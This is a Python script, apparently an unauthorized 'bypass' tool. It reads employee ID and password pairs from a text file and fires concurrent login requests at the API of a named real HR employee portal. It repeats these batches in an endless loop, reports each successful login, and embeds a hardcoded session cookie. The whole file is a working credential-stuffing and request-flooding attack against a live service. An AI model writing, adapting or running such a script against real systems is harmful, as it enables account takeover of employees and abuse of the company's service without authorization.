import aiohttp
import asyncio
import time

async def login(session, nik, password):
    data = {
        "Data": {
            "nik": nik,
            "pass": password,
        }
    }

    headers = {
        "Host": "api.hrindomaret.com",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://ess-online.hrindomaret.com",
        "Referer": "https://ess-online.hrindomaret.com/",
        "Cookie": "laravel_session=eyJpdiI6Ilp5TEV2R3ZUYmhKQWg2NnVoRGhTQlE9PSIsInZhbHVlIjoiSUxPcjRFRTdcL2kzb1NEU0ZNQUxDdWhoK1ZiNUxlekdLcmorMk1XM01ZUkd2K2RLQmZlR1IzWGZrWXUzYityWjYiLCJtYWMiOiI2OTU4Y2E1MGYyNTM1MjEyNTBlNTQ3ZWIxOWMwYjdmNzlhMTc4NmM5N2E1ZDAzYTZjZGViYzQzYmJlYzBkOTE5In0%3D",  # Ganti jika perlu
    }

    try:
        async with session.post("https://api.hrindomaret.com/api/ESS/Login", json=data, headers=headers) as response:
            response.raise_for_status()
            if response.status == 200:
                print(f"\n[INFO] BYPASS untuk NIK {nik} SUKSES")
                print(await response.json())
            else:
                print(f"\n[ERROR] Login gagal untuk NIK {nik}. Kode kesalahan: {response.status}")
                print(f"        Pesan: {await response.text()}\n")
    except aiohttp.ClientError as e:
        print(f"[ERROR] Terjadi kesalahan pada request: {e}\n")

async def login_multiple(nik_password_pairs, jumlah_periksa):
    async with aiohttp.ClientSession() as session:
        for i in range(jumlah_periksa):
            print(f"\n[INFO] BYPASS KE -{i + 1}")
            start_time = time.time()
            tasks = [login(session, nik, password) for nik, password in nik_password_pairs]
            await asyncio.gather(*tasks)
            print(f"[INFO] Waktu yang dibutuhkan: {time.time() - start_time:.2f} detik\n")

def main():
    # Membaca NIK dan password dari file
    nik_password_pairs = []
    with open("password.txt", "r") as file:
        for line in file:
            nik, password = line.strip().split(',')
            nik_password_pairs.append((nik, password))
    
    # Minta jumlah periksa dari pengguna
    try:
        jumlah_periksa = int(input("BYPASS BERAPA KALI? : "))
    except ValueError:
        print("[ERROR] Input tidak valid. Masukkan angka.")
        return

    # Jalankan pemeriksaan terus-menerus
    while True:
        asyncio.run(login_multiple(nik_password_pairs, jumlah_periksa))

if __name__ == "__main__":
    main()
